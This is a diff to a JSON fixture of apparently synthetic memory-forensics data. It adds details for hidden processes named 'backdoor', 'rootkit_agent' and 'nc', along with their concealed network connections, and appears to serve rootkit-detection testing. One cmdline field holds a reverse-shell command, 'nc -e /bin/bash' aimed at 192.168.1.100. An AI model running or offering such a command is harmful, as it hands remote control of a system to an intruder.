@@ -16,19 +16,58 @@
       "pid": 1337,
       "name": "backdoor",
       "ppid": 1,
-      "source": "psscan only"
+      "uid": 0,
+      "gid": 0,
+      "euid": 0,
+      "egid": 0,
+      "state": "S",
+      "start_time": "2026-04-25 09:30:00",
+      "comm": "backdoor",
+      "exe": "/tmp/.hidden/backdoor",
+      "cmdline": "/tmp/.hidden/backdoor -l 4444",
+      "in_pslist": false,
+      "in_psscan": true,
+      "in_pidhashtable": true,
+      "source": "psscan only",
+      "task_offset": "0xffff888012345000"
     },
     {
       "pid": 2048,
       "name": "rootkit_agent",
       "ppid": 1,
-      "source": "psscan only"
+      "uid": 0,
+      "gid": 0,
+      "euid": 0,
+      "egid": 0,
+      "state": "D",
+      "start_time": "2026-04-25 09:31:00",
+      "comm": "rootkit_agent",
+      "exe": "/lib/modules/rootkit_agent",
+      "cmdline": "rootkit_agent --daemon",
+      "in_pslist": false,
+      "in_psscan": true,
+      "in_pidhashtable": false,
+      "source": "psscan only",
+      "task_offset": "0xffff888087654000"
     },
     {
       "pid": 3000,
       "name": "nc",
       "ppid": 1337,
-      "source": "pidhashtable only"
+      "uid": 0,
+      "gid": 0,
+      "euid": 0,
+      "egid": 0,
+      "state": "S",
+      "start_time": "2026-04-25 09:32:00",
+      "comm": "nc",
+      "exe": "/usr/bin/nc",
+      "cmdline": "nc -e /bin/bash 192.168.1.100 4444",
+      "in_pslist": false,
+      "in_psscan": false,
+      "in_pidhashtable": true,
+      "source": "pidhashtable only",
+      "task_offset": "0xffff888099887000"
     }
   ],
   "processes_linux": [
@@ -102,13 +141,35 @@
   "hidden_connections": [
     {
       "pid": 1337,
+      "process": "backdoor",
       "proto": "TCP",
       "local_addr": "0.0.0.0",
       "local_port": 4444,
       "foreign_addr": "192.168.1.100",
       "foreign_port": 54321,
       "state": "ESTABLISHED",
-      "source": "netstat only"
+      "uid": 0,
+      "inode": 123456,
+      "net_ns": "4026531992",
+      "in_afinfo": true,
+      "in_netstat": false,
+      "source": "check_afinfo only"
+    },
+    {
+      "pid": 3000,
+      "process": "nc",
+      "proto": "TCP",
+      "local_addr": "0.0.0.0",
+      "local_port": 8080,
+      "foreign_addr": "10.10.10.1",
+      "foreign_port": 443,
+      "state": "ESTABLISHED",
+      "uid": 0,
+      "inode": 234567,
+      "net_ns": "4026531992",
+      "in_afinfo": true,
+      "in_netstat": false,
+      "source": "check_afinfo only"
     }
   ],
   "network_connections_linux": [
